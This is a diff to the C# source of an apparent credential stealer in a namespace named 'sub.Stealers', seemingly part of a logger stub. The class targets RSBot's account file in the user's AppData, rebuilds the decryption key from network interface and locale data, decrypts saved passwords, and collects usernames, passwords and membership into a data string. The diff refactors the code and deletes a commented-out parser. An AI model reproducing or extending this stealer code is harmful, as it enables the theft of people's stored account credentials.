@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
 using System.Net.NetworkInformation;
@@ -13,7 +14,7 @@ namespace sub.Stealers
 
         public void Collect()
         {
-            RSBotAccount[] accounts = GetLocalAccounts(GetLocalKey());
+            IEnumerable<RSBotAccount> accounts = GetLocalAccounts(GetLocalKey());
             foreach(RSBotAccount acc in accounts)
             {
                 Data += "RSBot Account - Name: " + acc.UserName + " Password: " + acc.Password + " Member: " +
@@ -21,26 +22,26 @@ namespace sub.Stealers
             }
         }
 
-        public const string SettingsFileName = "RSBot_Accounts.ini";
-        public static readonly string SettingsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
+        private const string SettingsFileName = "RSBot_Accounts.ini";
+        private string _settingsFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SettingsFileName);
         private const char Delimiter = 'a';
-        private const string UserStartCharacter = "[";
-        private const string UserEndCharacter = "]";
-        private const string PasswordHashItem = "password";
-        private const string PinItem = "pin";
-        private const string RewardItem = "reward";
-        private const string TakeBreaksItem = "take_breaks";
-        private const string MemberItem = "member";
+        private string _userStartCharacter = "[";
+        private string _userEndCharacter = "]";
+        private string _passwordHashItem = "password";
+        private string _pinItem = "pin";
+        private string _rewardItem = "reward";
+        private string _takeBreaksItem = "take_breaks";
+        private string _memberItem = "member";
 
-        public static RSBotAccount[] GetLocalAccounts(byte[] key)
+        private IEnumerable<RSBotAccount> GetLocalAccounts(byte[] key)
         {
-            using (StreamReader reader = new StreamReader(SettingsFile))
+            using (StreamReader reader = new StreamReader(_settingsFile))
             {
                 return GetLocalAccounts(reader.ReadToEnd(), key);
             }
         }
 
-        public static RSBotAccount[] GetLocalAccounts(string accountFileData, byte[] key)
+        private IEnumerable<RSBotAccount> GetLocalAccounts(string accountFileData, byte[] key)
         {
             //Needs to parse data out of accountFileData and decrypt password with key
             /*
@@ -50,90 +51,11 @@ namespace sub.Stealers
 
             return ret.ToArray();*/
 
-            //Original code is as follows but is broken and messy as fuck
-            /*public static RsBotAccount[] GetLocalAccounts(string accountFileData, byte[] key)
-		{
-			if (!File.Exists(SettingsFile)) {
-				throw new FileNotFoundException("could not find accounts file");
-			}
-
-			System.Collections.Generic.List<RsBotAccount> ret = new System.Collections.Generic.List<RsBotAccount>();
-			string[] split = accountFileData.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
-			for (int i = 0; i <= split.Length - 1; i++) {
-				if (!Strings.Split(i).StartsWith(UserStartCharacter)) {
-					continue;
-				}
-
-				string username = Strings.Split(i).Replace(UserStartCharacter, string.Empty).Replace(UserEndCharacter, string.Empty);
-				string passwordHash = null;
-				string password = null;
-				string pin = null;
-				string reward = null;
-				System.Nullable<bool> takeBreaks = null;
-				System.Nullable<bool> member = null;
-
-				int j = i + 1;
-				while (j < split.Length && !Strings.Split(j).StartsWith(UserStartCharacter)) {
-					int startEquals = Strings.Split(j).IndexOf('=');
-					if (startEquals <= 0) {
-						break; // TODO: might not be correct. Was : Exit While
-					}
-
-					string item = Strings.Split(j).Substring(0, startEquals);
-					string value = Strings.Split(j).Substring(startEquals + 1, Strings.Split(j).Length - startEquals - 1);
-					switch (item) {
-						case PasswordHashItem:
-							passwordHash = value;
-							password = RsBotUtil.DecryptPassword(passwordHash, key);
-							break; // TODO: might not be correct. Was : Exit Select
-
-							break;
-						case PinItem:
-							pin = value;
-							break; // TODO: might not be correct. Was : Exit Select
-
-							break;
-						case RewardItem:
-							reward = value;
-							break; // TODO: might not be correct. Was : Exit Select
-
-							break;
-						case TakeBreaksItem:
-							if (true) {
-								bool tmp = false;
-								takeBreaks = bool.TryParse(value, out tmp) && tmp;
-							}
-							break; // TODO: might not be correct. Was : Exit Select
-
-							break;
-						case MemberItem:
-							if (true) {
-								bool tmp = false;
-								member = bool.TryParse(value, out tmp) && tmp;
-							}
-							break; // TODO: might not be correct. Was : Exit Select
-
-							break;
-						default:
-							break; // TODO: might not be correct. Was : Exit Select
-
-							break;
-					}
-					j += 1;
-					i += 1;
-				}
-
-				RsBotAccount account = new RsBotAccount(username, password, passwordHash, pin, reward, takeBreaks, member);
-				ret.Add(account);
-			}
-
-			return ret.ToArray();
-		}
-             */
+            //Original code is in CooLogger-Stub.txt
             return null;
         }
 
-        private static byte[] GetLocalKey()
+        private byte[] GetLocalKey()
         {
             NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
             int lowestIndex = -1;
@@ -164,7 +86,7 @@ namespace sub.Stealers
                                                    CultureInfo.CurrentCulture.TwoLetterISOLanguageName);
         }
 
-        public static byte[] ConvertByteEncoding(byte[] key)
+        private byte[] ConvertByteEncoding(byte[] key)
         {
             byte[] ret = new byte[key.Length];
             Array.Copy(key, ret, key.Length);
@@ -180,12 +102,12 @@ namespace sub.Stealers
             return ret;
         }
 
-        private static bool IsValidIso88591(byte value)
+        private bool IsValidIso88591(byte value)
         {
             return value <= 127 || value >= 160;
         }
 
-        public static string DecryptPassword(string passwordHash, byte[] key)
+        private string DecryptPassword(string passwordHash, byte[] key)
         {
             byte[] hashedKey;
             using (SHA1 sha1 = SHA1.Create())
@@ -201,12 +123,7 @@ namespace sub.Stealers
             int i = 0;
             while (i < hashedKey.Length)
             {
-                int val;
-                if (!int.TryParse(splittedHash[i], out val))
-                {
-                    throw new ArgumentOutOfRangeException("passwordHash", "invalid password hash");
-                }
-
+                int val = Int32.Parse(splittedHash[i]);
                 sbyte sbVal = Convert.ToSByte(val);
                 if (sbVal == signedHashKey[i])
                 {
